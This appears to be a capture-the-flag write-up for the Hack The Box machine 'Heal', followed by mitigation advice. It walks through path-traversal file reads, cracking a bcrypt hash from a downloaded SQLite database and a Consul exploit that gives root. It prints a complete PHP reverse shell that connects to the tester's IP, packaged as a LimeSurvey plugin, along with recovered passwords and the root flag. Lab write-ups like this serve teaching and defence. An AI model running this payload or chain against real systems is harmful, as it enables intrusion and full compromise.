# Heal - Ashbo3n

## 1. Box Info

<table border="1" id="bkmrk-name-platform-and-di" style="border-collapse: collapse; width: 99.2857%; height: 81px;"><colgroup><col style="width: 50.0497%;"></col><col style="width: 50.0497%;"></col></colgroup><tbody><tr><td>**Name**

</td><td><span class="htb-text-primary htb-font-medium avatar-icon-name-details__name htb-heading-lg htb-font-bold" title="Heal">Heal</span></td></tr><tr><td>**Platform And Difficulty**

</td><td>HTB / 4.5</td></tr><tr><td>**Area Of Interest / Vulnerabilities Covered**

</td><td><div aria-label="Arbitrary File Read" class="htb-d-flex htb-justify-center htb-align-center chip htb-layer-00 htb-pa-8 htb-pl-12 htb-gap-8 htb-pr-16 chip htb-layer-02" role="presentation" to=""><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Read</span>, <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Weak Credentials,</span> <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Code Execution,</span> <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Directory Traversal</span></div></td></tr></tbody></table>

## 2. Reconnaissance &amp; Enumeration

### 2.1. Scoping the Network

We start our journey with a thorough port scan to identify the attack surface. In this phase, we look for "doors" (ports) that are open on the target.

**Nmap Scan:**

```
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap_initial
```

**Command Breakdown:**

- `-sV`: Service version detection (tells us what software is running).
- `-sC`: Runs default nmap scripts (checks for common vulnerabilities).
- `-p-`: Scans all 65,535 ports.
- `--min-rate=5000`: Speeds up the scan (be careful on real engagements as this is noisy).
- `-oN`: Saves the output to a normal text file for later reference.

**Output**

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### 2.2. Web Discovery

Upon identifying a web server on port \[Port\], I performed technology profiling and directory discovery. Web servers are often the most common entry point.

**WhatWeb Analysis:** WhatWeb identifies technologies used by a website (e.g., servers, embedded scripts, and CMS versions).

```
http://heal.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.231.237], Script, Title[Heal], X-Powered-By[Express], nginx[1.18.0]
```

**Directory &amp; VHost Fuzzing:** I utilized `ffuf` (Fuzz Faster U Fool) to discover hidden folders or subdomains that aren't linked on the main page.

```
ffuf -u http://[target_url]/FUZZ -w [wordlist_path] -mc 200
```

**Key Findings:**

None

## 4. Exploitation (Getting a Foothold)

### 4.1. Breaking In

Register and Log in to the website, generate a resume from [http://heal.htb/resume](http://heal.htb/resume) endpoint, intercept the request for /download endpoint, which would be like: `GET /download?filename=random_name HTTP/1.1` now replace that random filename with /etc/passwd proving the File Read Vulnerability:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Feb 2026 06:23:58 GMT
Content-Type: application/octet-stream
Content-Length: 2120
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: attachment; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 93e26c99-5714-4481-8b6c-fc3f8bc60be5
x-runtime: 0.006922
vary: Origin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<snip>
```

Great! Now we can get the Gem file, it is hard guessing paths, the first thought that came to my mind is to ask a AI to create a wordlist for potential wordlist which has all the paths it can be on, focusing on guessing, I in this got this wordlist:

```
Gemfile
../Gemfile
../../Gemfile
../../../Gemfile
../../../../Gemfile
../../../../../Gemfile
../../../../../../Gemfile
Gemfile.lock
../Gemfile.lock
../../Gemfile.lock
/var/www/Gemfile
/var/www/html/Gemfile
/app/Gemfile
/home/deploy/Gemfile
/home/ruby/Gemfile
/usr/src/app/Gemfile
/opt/app/Gemfile
```

Command Used -

```bash
ffuf -c -request Brute/Gem.req -request-proto http -w Brute/Gem.txt -ic
```

Result:

```bash
../../Gemfile.lock      [Status: 200, Size: 5185, Words: 1398, Lines: 232, Duration: 3062ms]
../../Gemfile           [Status: 200, Size: 1595, Words: 172, Lines: 53, Duration: 3182ms]
```

With this we can view the configurations, and mainly the DB, in `../../Gemfile` we can notice that website uses sqlite3 and we can also get the DB, from sending request to `../../config/database.yml` it returns

```
<snip...>

development:
  <<: *default
  database: storage/development.sqlite3

<snip...>
```

Now we know the DB file location we can just go there, `../../storage/development.sqlite3` we can download it via curl now:

```
curl -G --data-urlencode "filename=../../storage/development.sqlite3" -H "Authorization: Bearer <YOUR_TOKEN>" "http://api.heal.htb/download" -o development.sqlite3
```

and it returned 2 hashes:

```bash
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|ash@hot.com|$2a$12$XDBk/2FrcEF/fNrPhvBjM.Vbn8..365new02Uewa00R71JyFfm5BW|2026-02-06 06:15:17.159104|2026-02-06 06:15:17.159104|Ash|Ash|0
```

ash user is me. only 1 is in the DB, using hashcat we can crack it, hashcat command is:

```bash
hashcat -m 3200 hash.txt ~/wordlist/rockyou.txt
```

and its cracked! Here's the result:

```bash
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

SSH does not work. logging in into [http://heal.htb/resume](http://heal.htb/resume) as ralph does not help either, moving forward to survey, go to [http://take-survey.heal.htb/index.php/admin](http://take-survey.heal.htb/index.php/admin) and log in, We can find a dashboard there. Now create a folder with any name via mkdir 'Dir Name' and in that dir create 2 file: 1. Shell.php and config.xml, put this php code in revshell.php:

```python
<?php

set_time_limit (0);
$ip = '10.10.16.150';  // CHANGE THIS
$port = 4444;         // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = '/bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  // Parent exits
    }

    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>


```

And this as config.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>evil</name>
        <type>plugin</type>
        <creationDate>2025-04-1</creationDate>
        <lastUpdate>2025-04-1</lastUpdate>
        <author>TheRedP4nther</author>
        <authorUrl>https://github.com/TheRedP4nther</authorUrl>
        <supportUrl>https://github.com/TheRedP4nther</supportUrl>
        <version>6.6.4</version>
        <license>GNU General Public License version 3 or later</license>
        <description>
		<![CDATA[Author : TheRedP4nther]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>

```

Don't forget to change the IP.

zip them with zip -r Shell.zip \* note: This command will only work IF you are in the revshell payload and xml file dir, and make sure no other files are in that dir.

Now start a listener on port 4444 and in browser go to [http://take-survey.heal.htb/upload/plugins/evil/revshell.php](http://take-survey.heal.htb/upload/plugins/evil/revshell.php) and we will get a shell.

Going to /var/www/limesurvey/application/config we find a config.php file, Inside it we found creds for user ron which is ron:AdmiDi0\_pA$$w0rd Now we can ssh into the machine and get the user flag:

```bash
ron@heal:~$ ls
user.txt
ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
ron@heal:~$
```

## 4.2. Internal Enumeration

Using ss -tunlp i found out that a internal web server is running on port 8500, we can now port forward using `ssh -L 3000:127.0.0.1:8500 ron@[Target_IP]` Now we can access the internal web app by going to URL [http://127.0.0.1:3000/](http://127.0.0.1:3000/) And when we go there we see consul website, if you look in bottom left you can see the version number which we noted it to be **v.19.2**

## 5. Privilege Escalation (Scaling to Root)

### 5.1. The Escalation Path

Now we can search for a public Exploit, and i found this exploit: [https://www.exploit-db.com/exploits/51117](https://www.exploit-db.com/exploits/51117) Download it and if its extension is any other than .py please change it to .py, moving forward we have to give it 5 args: Rhost, Rport, Lhost, Lport and acl\_token, Rhost is machine's IP, Rport is the port which the host is running on which would be 3000, LHOST would be your tun0 or HTB assigned IP, LPORT would be port where your listener is listening, and lastly we can find ACL Token by first going to /etc dir and running the command `find . | grep consul` and then run the command `cat ./consul.d/config.json` Now copy the encrypt key value, whole Exploit Arg/command, should look like this:

```bash
python3 51117.py 127.0.0.1 3000 10.10.15.200 4444 l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ=
```

Received the shell on my listener:

```bash
root@heal:/# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@heal:/# cd /root
root@heal:~# ls
cleanup-consul.sh  consul-up.sh  plugin_cleanup.sh  root.txt
root@heal:~# cat root.txt 
f09c500db9ebe6cde9e782d2086d081c
[+] Got reverse shell from heal~10.129.231.237-Linux-x86_64 😍 Assigned SessionID <2>
root@heal:~# 

```

### Mitigations

#### 1.1. Arbitrary File Read &amp; Directory Traversal

The application allowed access to sensitive system files (like `/etc/passwd` and `development.sqlite3`) by manipulating the `filename` parameter in the `/download` endpoint.

- **Input Validation:** Implement a strict allow-list for file extensions and filenames.
- **Path Canonicalization:** Use system functions to resolve the absolute path and ensure the requested file resides within the intended directory (e.g., `realpath()` in PHP or `os.path.abspath()` in Python).
- **Indirect Object References:** Instead of passing raw filenames, use a database ID or a random UUID mapped to the file on the backend.

#### 1.2. Insecure Credential Storage

The SQLite database stored user passwords using bcrypt (cost factor 12). While bcrypt is robust, the presence of a weak administrative password (`147258369`) allowed for successful cracking. Additionally, plaintext credentials for the user `ron` were found in a configuration file.

- **Strong Password Policies:** Enforce minimum length (12+ characters) and complexity requirements to prevent dictionary and brute-force attacks.
- **Secrets Management:** Never store database or SSH credentials in plaintext configuration files. Use environment variables or dedicated vaults (e.g., HashiCorp Vault, AWS Secrets Manager).

#### 1.3. Remote Code Execution (RCE) via Plugin Upload

The LimeSurvey instance allowed an authenticated administrator to upload a ZIP file containing a PHP reverse shell.

- **File Upload Security:** Restrict file uploads to non-executable types. If plugins are necessary, implement a manual review process or integrity checks (code signing).
- **Web Server Hardening:** Configure the web server to disable execution of scripts within the `/upload/` directory (e.g., using `NoExec` in Apache or `location ^~ /upload/ { deny all; }` logic in Nginx for PHP files).

#### 1.4. Consul Misconfiguration (Privilege Escalation)

The internal Consul service (v1.19.2) was vulnerable to an RCE exploit due to the exposure of the ACL token and the ability to register malicious services/checks that execute commands as the root user.

- **Network Segmentation:** Ensure administrative interfaces like Consul are only accessible via authenticated VPNs or specific management IPs, not bound to interfaces reachable by low-privileged users if not required.
- **Least Privilege:** Configure Consul agents to run as a non-privileged service user rather than `root`
- **Disable Script Checks:** Disable the `enable_script_checks` or `enable_local_script_checks` setting in the Consul configuration to prevent arbitrary command execution through service health checks.

### Summary of Mitigations

<table data-path-to-node="16" id="bkmrk-vulnerability-remedi" style="margin-bottom: 32px; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><thead style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Vulnerability**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Remediation Action**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Impact Level**</td></tr></thead><tbody style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,1,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Directory Traversal**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,1,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">Use an allow-list for files and sanitize paths using canonicalization.</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,1,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**High**</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,2,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Weak Credentials**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,2,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">Enforce high-entropy password requirements and Rotate 'ron' credentials.</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,2,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Medium**</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,3,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Insecure File Upload**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,3,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">Disable PHP execution in upload directories; implement file-type validation.</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,3,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Critical**</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,4,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Plaintext Secrets**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,4,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">Move credentials from `config.php` to environment variables or a Secret Vault.</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,4,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**High**</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,5,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Consul RCE**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,5,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">Disable remote script checks and run the Consul service as a non-root user.</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="16,5,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Critical**</span></td></tr></tbody></table>
